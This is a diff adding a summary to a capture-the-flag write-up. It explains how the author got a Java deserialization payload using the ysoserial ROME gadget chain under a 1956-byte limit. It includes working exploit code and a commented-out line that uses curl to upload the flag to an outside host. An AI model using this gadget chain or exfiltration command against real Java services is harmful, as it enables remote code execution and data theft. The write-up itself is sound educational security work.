@@ -11,6 +11,91 @@ Description: make it shorter !
 Attachment: `shorter.zip`
 
 # Summary
+If you want to know how I solved this challenge step-by-step, skip this summary and start reading at the section [How I solved it](#how-i-solved-it).
+
+The goal of this challenge was to exploit untrusted deserialization of a user provided java object. I had to provide the payload to the challenge server encoded in base64 which couldn't exceed a length of **1956** characters. My exploit to get the flag is based on the **ysoserial** `ROME` payload.
+
+These methods will be called upon deserialization of the payload from bottom to top:
+
+```Java
+/**
+ *
+ * TemplatesImpl.getOutputProperties()
+ * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
+ * NativeMethodAccessorImpl.invoke(Object, Object[])
+ * DelegatingMethodAccessorImpl.invoke(Object, Object[])
+ * Method.invoke(Object, Object...)
+ * ToStringBean.toString(String)
+ * ToStringBean.toString()
+ * ObjectBean.toString()
+ * EqualsBean.beanHashCode()
+ * ObjectBean.hashCode()
+ * HashMap<K,V>.hash(Object)
+ * HashMap<K,V>.readObject(ObjectInputStream)
+ *
+ * @author mbechler
+ *
+ */
+ ```
+ 
+ To get these methods to execute the bytecode in the payload this arrangement of objects is required:
+ ```Java
+ Object o = createTemplatesImpl();
+ObjectBean objBean1 = new ObjectBean(Templates.class, o);
+ObjectBean objBean2  = new ObjectBean(ObjectBean.class, objBean1);
+return makeMap(objBean2);
+ ```
+ 
+ `makeMap()` creates a HashMap containing objBean2 without calling the hash method on it. (This would execute the exploit)
+ To get the payload below **1956 bytes** the code must be compiled with the `-g:none` flag to disable debug information in the class files. Additionally, some changes need to be made to `createTemplatesImpl()`. My custom `createTemplatesImppl()`:
+ 
+ ```Java
+ public static <T> T createTemplatesImpl ( Class<T> tplClass, Class<?> abstTranslet )
+    throws Exception {
+    final T templates = tplClass.newInstance();
+    ClassPool pool = ClassPool.getDefault();
+    pool.insertClassPath(new ClassClassPath(F.class));
+    pool.insertClassPath(new ClassClassPath(abstTranslet));
+    final CtClass clazz = pool.get(F.class.getName());
+//        String cmd = "java.lang.Runtime.getRuntime().exec(\"curl -T flag your_server.com\");";
+    String cmd = "java.lang.System.exit(33);";
+    clazz.makeClassInitializer().insertAfter(cmd);
+    clazz.setName("o");
+    CtClass superC = pool.get(abstTranslet.getName());
+    clazz.setSuperclass(superC);
+    byte[] classBytes = clazz.toBytecode();
+    try (FileOutputStream fos = new FileOutputStream("exploit.class")) {
+        fos.write(classBytes);
+    }
+    System.out.println("Length of raw bytecode: " + classBytes.length);
+    Field bytecodes = tplClass.getDeclaredField("_bytecodes");
+    bytecodes.setAccessible(true);
+    byte[] secondClassBytes = classAsBytes(F.class);
+    System.out.println("Second class byte length:" + secondClassBytes.length);
+    bytecodes.set(templates, new byte[][] {
+            classBytes, secondClassBytes
+    });
+    setField(templates, "_name", "_");
+    return templates;
+}
+```
+
+Noteable changes:
+* Both `Foo` and `StubTransletPayload` have been replaced by an empty class `F`
+* The exploit is inserted into the static section of this empty class using **javassist**
+* The new `StubTransletPayload` extends `AbstractTranslet` through bytecode patched by **javassist** and doesn't override all necessary methods to save space
+* Most names have been shortened to save space
+
+Finally, to shave off the last few bytes off the payload these private member variables of the `ObjectBean` need to be set to null:
+* `objBean1._equalsBean`
+* `objBean1._cloneableBean`
+* `objBean2._cloneableBean`
+* `objBean2._equalsBean._beanClass`
+* `objBean2._toStringBean`
+
+The payload can now be serialized and should be below **1956 bytes**.
+
+To see how I came up with all these modifications and to get a more in depth understanding of the payload and the inner workings of java serialization continue reading.
 
 # How I solved it
 
@@ -43,7 +128,7 @@ So I continued to look at the `MainController.class` file as it was the only oth
 
 As you can see, there is one POST and one GET route defined. The GET requests just returns `"hello"` but the POST request is more interesting. The POST request accepts one parameter called `baseStr` which can't be longer than 1956 bytes. This string is then decoded from **base64** to a `byte[]` array. Using the decorator pattern this byte array is then passed through an `ByteInputStream` to an `ObjectInputStream`. A single object is then deserialized from the byte stream by the `readObject()` call. The POST request then returns `"hello"`.
 
-Looking at this code and because nothing is done with the object after deserializing it, it was clear to me that there must exist a vulnerability in the deserialization code of some classes.
+Because nothing is done with the object after deserializing it, it was clear to me that there must exist a vulnerability in the deserialization code of some classes.
 
 ## Brushing up my Java serialization knowledge
 
